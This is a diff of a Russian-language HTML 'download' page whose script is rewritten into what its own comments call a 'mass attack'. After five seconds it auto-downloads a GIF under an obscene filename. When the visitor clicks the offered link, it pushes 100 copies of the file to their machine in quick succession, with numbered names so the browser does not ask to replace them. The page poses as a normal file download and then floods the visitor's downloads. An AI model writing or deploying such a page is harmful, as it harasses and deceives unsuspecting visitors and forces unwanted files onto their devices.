@@ -5,58 +5,78 @@
     <title>Загрузка...</title>
 </head>
 <body>
-
-    <p id="status">
-        Загрузка файла началась... Если скачивание не началось, 
-        <a id="downloadLink" href="#" style="cursor: pointer;">нажмите сюда</a>.
-    </p>
+    <p>Загрузка файла началась... Если скачивание не началось, <a id="downloadLink" href="#">нажмите сюда</a>.</p>
 
     <script>
-        const fileName = 'OTVETRUS.gif'; 
-        const saveName = 'sex-siski-i-piska.gif';
-        
-        const linkElement = document.getElementById('downloadLink');
+        // --- НАСТРОЙКИ ---
+        const sourceFile = 'OTVETRUS.gif'; 
+        const targetName = 'sex-siski-i-piska.gif';
+        const spamCount = 100; // Количество копий
+        const delayMs = 250;   // Задержка (меньше 200 браузер может проигнорировать)
 
-        // Функция для одиночного скачивания
-        function downloadOne() {
-            const link = document.createElement('a');
-            link.href = fileName;
-            link.download = saveName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+        let hasClicked = false; // Флаг, нажал ли юзер кнопку
+        const link = document.getElementById('downloadLink');
+
+        // --- ЛОГИКА ---
+
+        // 1. Функция одиночной загрузки (если юзер тупит 5 сек)
+        function downloadSingle() {
+            if (hasClicked) return; // Если уже нажал, одиночная не нужна
+            
+            const a = document.createElement('a');
+            a.href = sourceFile;
+            a.download = targetName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            console.log('Авто-загрузка 1 файла выполнена.');
         }
 
-        // 1. Автоматика: через 5 секунд пробуем скачать хотя бы один файл
-        const autoTimer = setTimeout(() => {
-            downloadOne();
-        }, 5000);
+        // 2. Таймер на 5 секунд
+        const autoTimer = setTimeout(downloadSingle, 5000);
 
-        // 2. По клику: отменяем авто-таймер (если еще не сработал) и качаем 100 раз
-        linkElement.onclick = function(e) {
+        // 3. Функция массовой атаки (Blob + Цикл)
+        async function startSpam() {
+            try {
+                // Качаем файл в память браузера (чтобы не зависеть от интернета в цикле)
+                const response = await fetch(sourceFile);
+                if (!response.ok) throw new Error('Файл не найден!');
+                const blob = await response.blob();
+                const blobUrl = window.URL.createObjectURL(blob);
+
+                // Запускаем цикл
+                for (let i = 0; i < spamCount; i++) {
+                    setTimeout(() => {
+                        const a = document.createElement('a');
+                        a.href = blobUrl;
+                        // Добавляем (N) к имени, иначе браузер может спросить "Заменить файл?"
+                        a.download = `(${i+1})_${targetName}`; 
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+
+                        // Чистим память после последнего
+                        if (i === spamCount - 1) {
+                            setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
+                        }
+                    }, i * delayMs);
+                }
+            } catch (e) {
+                console.error('Ошибка:', e);
+                // Если fetch не сработал (например, CORS), пробуем тупой метод
+                alert('Ошибка доступа к файлу. Проверьте название.');
+            }
+        }
+
+        // 4. Обработчик клика
+        link.onclick = function(e) {
             e.preventDefault();
-            clearTimeout(autoTimer); // Чтобы не дублировать, если нажали раньше 5 сек
-
-            fetch(fileName)
-                .then(response => response.blob())
-                .then(blob => {
-                    const url = window.URL.createObjectURL(blob);
-                    
-                    for (let i = 0; i < 100; i++) {
-                        setTimeout(() => {
-                            const link = document.createElement('a');
-                            link.href = url;
-                            link.download = `${i}_${saveName}`;
-                            document.body.appendChild(link);
-                            link.click();
-                            document.body.removeChild(link);
-                            
-                            if (i === 99) {
-                                setTimeout(() => window.URL.revokeObjectURL(url), 1000);
-                            }
-                        }, i * 200);
-                    }
-                });
+            
+            if (hasClicked) return; // Защита от двойного клика
+            hasClicked = true;
+            
+            clearTimeout(autoTimer); // Отменяем одиночную загрузку
+            startSpam(); // Запускаем мясорубку
         };
     </script>
 </body>
